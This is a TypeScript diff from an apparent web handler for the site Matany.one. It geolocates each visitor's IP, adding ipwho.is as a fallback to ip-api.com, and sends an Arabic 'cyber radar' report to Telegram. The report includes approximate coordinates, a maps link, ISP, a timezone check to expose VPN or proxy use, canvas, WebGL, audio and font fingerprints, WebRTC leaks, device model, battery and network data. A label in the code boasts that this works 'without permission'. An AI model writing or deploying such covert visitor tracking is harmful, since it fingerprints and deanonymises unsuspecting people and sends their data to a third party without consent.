@@ -93,10 +93,11 @@ async function resolveServerGeo(ip: string): Promise<ServerGeo> {
     return {};
   }
 
+  // 1. Primary: ip-api.com
   try {
     const res = await fetch(
       `http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,regionName,city,district,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting`,
-      { signal: AbortSignal.timeout(3500) }
+      { signal: AbortSignal.timeout(3000) }
     );
     if (res.ok) {
       const data = await res.json();
@@ -120,8 +121,37 @@ async function resolveServerGeo(ip: string): Promise<ServerGeo> {
         };
       }
     }
-  } catch (err) {
-    console.error('[Telemetry] Server Geo Lookup error:', err);
+  } catch {
+    // try secondary fallback
+  }
+
+  // 2. High-Precision Secondary Fallback: ipwho.is
+  try {
+    const res2 = await fetch(`https://ipwho.is/${ip}`, { signal: AbortSignal.timeout(3000) });
+    if (res2.ok) {
+      const data2 = await res2.json();
+      if (data2.success) {
+        return {
+          country: data2.country,
+          countryCode: data2.country_code,
+          region: data2.region,
+          city: data2.city,
+          district: '',
+          zip: data2.postal,
+          lat: data2.latitude,
+          lon: data2.longitude,
+          timezone: data2.timezone?.id,
+          isp: data2.connection?.isp,
+          org: data2.connection?.org,
+          as: data2.connection?.asn ? `AS${data2.connection.asn} ${data2.connection.org || ''}` : undefined,
+          isMobile: false,
+          isProxy: false,
+          isHosting: false,
+        };
+      }
+    }
+  } catch {
+    // fallback exhausted
   }
 
   return {};
@@ -268,51 +298,69 @@ export default async function handler(req: Request) {
       clientData.clientHintsPlatformVersion ? `إصدار النواة: v${clientData.clientHintsPlatformVersion}` : null,
     ].filter(Boolean).join(' | ') || 'معمارية الويب الافتراضية';
 
+    const clientTz = clientData.timezone;
+    const serverTz = serverGeo.timezone || vercelTz;
+    let tzVerification = '✅ متطابق مع المنطقة الجغرافية للشبكة';
+    if (clientTz && serverTz && !clientTz.includes(serverTz) && !serverTz.includes(clientTz)) {
+      tzVerification = `⚠️ انحراف (المتصفح: ${clientTz} | الشبكة: ${serverTz}) - مؤشر VPN / Proxy`;
+    }
+
+    const postalCode = serverGeo.zip ? ` | الرمز البريدي: <code>${escapeHtml(serverGeo.zip)}</code>` : '';
+    const coordinatesText = latitude && longitude ? `<code>${latitude.toFixed(4)}, ${longitude.toFixed(4)}</code>` : 'غير متوفر';
+
     // 5. Construct Master HTML Telegram Message
     const telegramMessage = `
 ${visitBadge}
-🌐 <b>الرادار السيبراني والاستخباراتي - Matany.one</b>
+🌐 <b>منظومة الرادار والاستخبارات السيبرانية - Matany.one</b>
 ━━━━━━━━━━━━━━━━━━━━━
-📍 <b>الموقع الجغرافي والشبكة (بدون أذونات):</b>
+📍 <b>الموقع الجغرافي والشبكة (استشعار سلبي بدون إذن):</b>
 • الدولة: <b>${escapeHtml(countryName)}</b>
-• المدينة والمحافظة: <b>${escapeHtml(cityName)} - ${escapeHtml(regionName)}${escapeHtml(districtName)}</b>
+• المدينة والمحافظة: <b>${escapeHtml(cityName)} - ${escapeHtml(regionName)}${escapeHtml(districtName)}</b>${postalCode}
 • عنوان الآي بي (IP): <code>${escapeHtml(finalIp)}</code>
+• الإحداثيات التقريبية: ${coordinatesText}
 • مزود خدمة الإنترنت (ISP): <b>${escapeHtml(ispName)}</b>
 • المنظومة المستقلة (ASN): <code>${escapeHtml(asnInfo)}</code>
-• خرائط جوجل: ${mapsLink}
+• خرائط جوجل المباشرة: ${mapsLink}
 • المنطقة الزمنية: <b>${escapeHtml(timezone)} (فرق التوقيت: ${escapeHtml(clientData.timezoneOffsetHours ?? 0)} س)</b>
-• طبيعة الاتصال:
+• فحص تطابق التوقيت: <b>${tzVerification}</b>
+• سلامة وطبيعة الاتصال:
 • ${networkTagsText}
 
-🧬 <b>بصمة العتاد الفائقة (Hardware Fingerprint):</b>
-• المعرف السيبراني الشامل (Master ID): <code>${escapeHtml(masterHash)}</code>
-• بصمة الكانفاس (Canvas 2D Hash): <code>${escapeHtml(canvasHash)}</code>
-• بصمة الشادر والرسم (WebGL 3D Hash): <code>${escapeHtml(webglHash)}</code>
-• بصمة الصوت والمعالجة (AudioContext Hash): <code>${escapeHtml(audioHash)}</code>
-• بصمة خطوط النظام (Typography Hash): <code>${escapeHtml(typographyHash)}</code>
-• دقة التمييز وقوة البصمة (Shannon Entropy): <b>${escapeHtml(entropyBits)} bits (${escapeHtml(uniquenessPct)}% فرادة مطلقة)</b>
-• تسريب WebRTC (Candidate / Reflected): <code>${escapeHtml(webrtcText)}</code>
-• خطوط النظام المكتشفة: <b>${escapeHtml(detectedFontsText)}</b>
-• مؤشرات العميل (Client Hints): <b>${escapeHtml(clientHintsText)}</b>
-
-📱 <b>مواصفات وتحديد الجهاز الإجباري (Brand & Exact Model 100%):</b>
+📱 <b>هوية وموديل الجهاز الإجباري (Brand First 100%):</b>
 • الشركة المصنعة (Brand): <b>${escapeHtml(phoneBrand)}</b>
 • الطراز والموديل الدقيق: <b>${escapeHtml(phoneModel)}</b>
-• التوصيف الكامل للمنتج: <b>${escapeHtml(phoneFullName)}</b>
-• نسبة الدقة واليقين: <b>${escapeHtml(confidenceScore)}% (تقنية: ${escapeHtml(detectionMethod)})</b>
-• التصنيف: <b>${escapeHtml(deviceCategory)}</b>
+• التوصيف التجاري الكامل: <b>${escapeHtml(phoneFullName)}</b>
+• نسبة التأكيد العتادي: <b>${escapeHtml(confidenceScore)}% (تقنية: ${escapeHtml(detectionMethod)})</b>
+• تصنيف الجهاز: <b>${escapeHtml(deviceCategory)}</b>
 • نظام التشغيل: <b>${escapeHtml(osFull)}</b>
-• المتصفح: <b>${escapeHtml(browserFull)}</b>
-• كارت الشاشة الفعلي (GPU): <code>${escapeHtml(clientData.gpuRenderer || 'غير متاح')}</code>
-• مواصفات العتاد: <b>${escapeHtml(hardwareSummary)}</b>
-• أبعاد الشاشة: <b>${escapeHtml(screenSummary)}</b>
-• مزايا الشاشة: <b>${escapeHtml(displayFeatures)}</b>
+• المتصفح والمحرك: <b>${escapeHtml(browserFull)}</b>
 
-🔋 <b>حالة البطارية والطاقة:</b>
+🖥️ <b>المواصفات العتادية وبصمة الشاشة:</b>
+• كارت الشاشة الفعلي (GPU): <code>${escapeHtml(clientData.gpuRenderer || 'غير متاح')}</code>
+• الشركة المصنعة للكارت: <code>${escapeHtml(clientData.gpuVendor || 'غير متاح')}</code>
+• قوة المعالجة: <b>${escapeHtml(clientData.cpuCores || '?')} أنوية</b> | الرام: <b>${escapeHtml(clientData.ramGb || 'N/A')}</b>
+• الدقة الفيزيائية الحقيقية: <b>${escapeHtml(clientData.physicalResolution || screenSummary)}</b>
+• أبعاد العرض (CSS): <b>${escapeHtml(clientData.cssResolution || 'غير متاح')}</b>
+• تردد الشاشة والانتعاش: <b>${clientData.refreshRateHz ? `${clientData.refreshRateHz}Hz` : '60Hz'}</b>
+• التدرج اللوني: <b>${escapeHtml(clientData.colorGamut || 'sRGB')} ${clientData.hdrSupported ? '✦ HDR مدعوم' : ''}</b>
+• استشعار اللمس: <b>${clientData.touchSupported ? `شاشة لمس (${clientData.touchPoints || 5} نقاط)` : 'لا يدعم اللمس'}</b>
+
+🔋 <b>الطاقة وحالة البطارية:</b>
 • حالة الشحن: <b>${escapeHtml(batteryDisplay)}</b>
 
-📶 <b>سرعة التصفح والشبكة:</b>
-• تفاصيل السرعة: <b>${escapeHtml(speedInfo)}</b>
+📶 <b>بيانات السرعة والاتصال:</b>
+• نوع الاتصال: <b>${escapeHtml(clientData.networkType || 'طبيعي')}</b>
+• السرعة المقاسة: <b>${clientData.downlinkSpeedMbps ? `${clientData.downlinkSpeedMbps} Mbps` : 'غير محدد'}</b> | زمن الاستجابة (Ping): <b>${clientData.rttLatencyMs ? `${clientData.rttLatencyMs}ms` : 'غير محدد'}</b>
+
+🧬 <b>البصمة السيبرانية الفائقة (Hardware Fingerprint):</b>
+• المعرف السيبراني الشامل (Master ID): <code>${escapeHtml(masterHash)}</code>
+• بصمة الكانفاس (Canvas 2D): <code>${escapeHtml(canvasHash)}</code>
+• بصمة الشادر والرسم (WebGL 3D): <code>${escapeHtml(webglHash)}</code>
+• بصمة معالجة الصوت (AudioContext): <code>${escapeHtml(audioHash)}</code>
+• بصمة الخطوط والتنضيد (Typography): <code>${escapeHtml(typographyHash)}</code>
+• دقة البصمة والفرادة (Entropy): <b>${escapeHtml(entropyBits)} bits (${escapeHtml(uniquenessPct)}% فرادة مطلقة)</b>
+• تسريب الـ WebRTC: <code>${escapeHtml(webrtcText)}</code>
+• خطوط النظام المكتشفة: <b>${escapeHtml(detectedFontsText)}</b>
 
 🕵️ <b>جلسة التصفح وهوية الزائر:</b>
 • توقيت الدخول: <b>${escapeHtml(clientData.localTime || new Date().toLocaleString('ar-EG'))}</b>
